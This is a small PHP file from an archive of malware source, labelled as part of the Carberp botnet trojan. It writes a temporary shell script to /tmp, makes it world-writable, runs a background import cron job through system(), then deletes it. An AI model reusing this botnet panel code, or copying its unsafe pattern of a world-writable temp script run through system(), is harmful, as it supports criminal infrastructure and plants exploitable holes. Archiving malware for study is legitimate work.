#!/usr/bin/env php
/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
<?php

$dir = pathinfo(__FILE__, PATHINFO_DIRNAME) . '/';
$dir = realpath('../') . '/';

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';

if($config['filters'] == 1){
	file_put_contents('/tmp/import.sh', '#!/bin/sh' . "\n");
	file_put_contents('/tmp/import.sh', 'cd ' . $dir . 'crons/scripts/' . "\n", FILE_APPEND);
	file_put_contents('/tmp/import.sh', '/bin/env php ' . $dir . 'crons/scripts/import.php > /dev/null &', FILE_APPEND);
	chmod('/tmp/import.sh', 0777);
	@system('/tmp/import.sh');
    unlink('/tmp/import.sh');
}

?>